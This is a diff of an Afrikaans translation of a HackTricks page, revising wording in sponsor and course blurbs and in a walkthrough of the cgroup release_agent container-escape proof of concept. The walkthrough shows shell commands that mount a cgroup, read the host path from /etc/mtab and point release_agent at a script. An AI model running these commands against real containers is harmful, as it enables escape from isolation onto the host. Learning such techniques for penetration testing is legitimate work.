@@ -2,25 +2,25 @@
 
 <details>
 
-<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Ander maniere om HackTricks te ondersteun:
 
 * As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
-## WhiteIntel
+### [WhiteIntel](https://whiteintel.io)
 
-<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
 
-[**WhiteIntel**](https://whiteintel.io) is 'n **dark-web** aangedrewe soekenjin wat **gratis** funksies bied om te kontroleer of 'n maatskappy of sy kliënte **gekompromitteer** is deur **steelmalware**.
+[**WhiteIntel**](https://whiteintel.io) is 'n **dark-web** aangedrewe soekenjin wat **gratis** funksies bied om te kontroleer of 'n maatskappy of sy kliënte deur **steel-malware** **gekompromiteer** is.
 
-Hul primêre doel van WhiteIntel is om rekening-oorneem en lospryse-aanvalle te bekamp wat voortspruit uit inligtingsteelmalware.
+Die primêre doel van WhiteIntel is om rekening-oorneem en losgeldware-aanvalle te beveg wat voortspruit uit inligtingsteel-malware.
 
 Jy kan hul webwerf besoek en hul enjin vir **gratis** probeer by:
 
@@ -47,14 +47,14 @@ Die bewys van konsep (PoC) demonstreer 'n metode om cgroups te misbruik deur 'n 
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 ```
 2. **Stel die Kind Cgroup op:**
-   - 'n Kind cgroup genaamd "x" word geskep binne die gemonteerde cgroup gids.
-   - Kennisgewings word geaktiveer vir die "x" cgroup deur 1 na sy notify_on_release lêer te skryf.
+- 'n Kind cgroup met die naam "x" word geskep binne die gemoniteerde cgroup-gids.
+- Kennisgewings word geaktiveer vir die "x" cgroup deur 1 na sy notify_on_release-lêer te skryf.
 ```shell
 echo 1 > /tmp/cgrp/x/notify_on_release
 ```
 3. **Stel die Vrystellingsagent in:**
 - Die pad van die houer op die gasheer word verkry uit die /etc/mtab-lêer.
-- Die release_agent-lêer van die cgroup word dan ingestel om 'n skrip genaamd /cmd uit te voer wat op die verkrygte gasheerpad geleë is.
+- Die release_agent-lêer van die cgroup word dan ingestel om 'n skrip genaamd /cmd uit te voer wat geleë is op die verkrygte gasheerpad.
 ```shell
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
@@ -72,15 +72,15 @@ chmod a+x /cmd
 ```shell
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
-## WhiteIntel
+### [WhiteIntel](https://whiteintel.io)
 
-<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
 
-[**WhiteIntel**](https://whiteintel.io) is 'n **dark-web** aangedrewe soekenjin wat **gratis** funksies bied om te kontroleer of 'n maatskappy of sy kliënte deur **steelmalware** **gekompromiteer** is.
+[**WhiteIntel**](https://whiteintel.io) is 'n **dark-web** aangedrewe soekenjin wat **gratis** funksies bied om te kontroleer of 'n maatskappy of sy kliënte deur **diewe malware** gekompromitteer is.
 
-Hul primêre doel van WhiteIntel is om rekening-oorneemings en lospryse-aanvalle te beveg wat voortspruit uit inligtingsteelmalware.
+Hul primêre doel van WhiteIntel is om rekening-oorneemings en losgeldaanvalle te beveg wat voortspruit uit inligtingsteel-malware.
 
-Jy kan hul webwerf besoek en hul enjin vir **gratis** probeer by:
+Jy kan hul webwerf besoek en hul enjin **gratis** probeer by:
 
 {% embed url="https://whiteintel.io" %}
 
